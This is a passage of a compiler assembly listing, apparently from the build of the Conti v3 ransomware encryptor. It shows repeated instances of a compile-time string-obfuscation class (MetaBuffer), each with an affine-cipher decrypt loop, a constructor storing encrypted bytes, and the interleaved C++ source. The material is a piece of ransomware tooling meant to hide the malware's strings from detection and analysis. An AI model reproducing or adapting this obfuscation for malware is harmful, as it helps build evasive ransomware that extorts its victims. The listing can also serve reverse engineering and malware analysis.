?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 29	 mov	 BYTE PTR [rcx+1], 41	; 00000029H
  00007	c6 41 02 10	 mov	 BYTE PTR [rcx+2], 16
  0000b	c6 41 03 24	 mov	 BYTE PTR [rcx+3], 36	; 00000024H
  0000f	c6 41 04 10	 mov	 BYTE PTR [rcx+4], 16
  00013	c6 41 05 59	 mov	 BYTE PTR [rcx+5], 89	; 00000059H
  00017	c6 41 06 10	 mov	 BYTE PTR [rcx+6], 16
  0001b	c6 41 07 4f	 mov	 BYTE PTR [rcx+7], 79	; 0000004fH
  0001f	c6 41 08 10	 mov	 BYTE PTR [rcx+8], 16
  00023	c6 41 09 10	 mov	 BYTE PTR [rcx+9], 16
  00027	c6 41 0a 10	 mov	 BYTE PTR [rcx+10], 16
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 3f	 sub	 ecx, 63			; 0000003fH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6e	 mov	 BYTE PTR [rcx+1], 110	; 0000006eH
  00007	c6 41 02 3f	 mov	 BYTE PTR [rcx+2], 63	; 0000003fH
  0000b	c6 41 03 43	 mov	 BYTE PTR [rcx+3], 67	; 00000043H
  0000f	c6 41 04 3f	 mov	 BYTE PTR [rcx+4], 63	; 0000003fH
  00013	c6 41 05 4c	 mov	 BYTE PTR [rcx+5], 76	; 0000004cH
  00017	c6 41 06 3f	 mov	 BYTE PTR [rcx+6], 63	; 0000003fH
  0001b	c6 41 07 16	 mov	 BYTE PTR [rcx+7], 22
  0001f	c6 41 08 3f	 mov	 BYTE PTR [rcx+8], 63	; 0000003fH
  00023	c6 41 09 3f	 mov	 BYTE PTR [rcx+9], 63	; 0000003fH
  00027	c6 41 0a 3f	 mov	 BYTE PTR [rcx+10], 63	; 0000003fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0c 00 00 00	 mov	 eax, 12
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4c	 mov	 BYTE PTR [rcx+1], 76	; 0000004cH
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 55	 mov	 BYTE PTR [rcx+3], 85	; 00000055H
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 76	 mov	 BYTE PTR [rcx+5], 118	; 00000076H
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 7d	 mov	 BYTE PTR [rcx+7], 125	; 0000007dH
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 49 00 00 00	 mov	 eax, 73			; 00000049H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 26	 mov	 BYTE PTR [rcx+1], 38	; 00000026H
  00007	c6 41 02 49	 mov	 BYTE PTR [rcx+2], 73	; 00000049H
  0000b	c6 41 03 2b	 mov	 BYTE PTR [rcx+3], 43	; 0000002bH
  0000f	c6 41 04 49	 mov	 BYTE PTR [rcx+4], 73	; 00000049H
  00013	c6 41 05 13	 mov	 BYTE PTR [rcx+5], 19
  00017	c6 41 06 49	 mov	 BYTE PTR [rcx+6], 73	; 00000049H
  0001b	c6 41 07 0f	 mov	 BYTE PTR [rcx+7], 15
  0001f	c6 41 08 49	 mov	 BYTE PTR [rcx+8], 73	; 00000049H
  00023	c6 41 09 49	 mov	 BYTE PTR [rcx+9], 73	; 00000049H
  00027	c6 41 0a 49	 mov	 BYTE PTR [rcx+10], 73	; 00000049H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4e 00 00 00	 mov	 eax, 78			; 0000004eH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 18	 mov	 BYTE PTR [rcx+1], 24
  00007	c6 41 02 4e	 mov	 BYTE PTR [rcx+2], 78	; 0000004eH
  0000b	c6 41 03 44	 mov	 BYTE PTR [rcx+3], 68	; 00000044H
  0000f	c6 41 04 4e	 mov	 BYTE PTR [rcx+4], 78	; 0000004eH
  00013	c6 41 05 3a	 mov	 BYTE PTR [rcx+5], 58	; 0000003aH
  00017	c6 41 06 4e	 mov	 BYTE PTR [rcx+6], 78	; 0000004eH
  0001b	c6 41 07 6d	 mov	 BYTE PTR [rcx+7], 109	; 0000006dH
  0001f	c6 41 08 4e	 mov	 BYTE PTR [rcx+8], 78	; 0000004eH
  00023	c6 41 09 4e	 mov	 BYTE PTR [rcx+9], 78	; 0000004eH
  00027	c6 41 0a 4e	 mov	 BYTE PTR [rcx+10], 78	; 0000004eH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

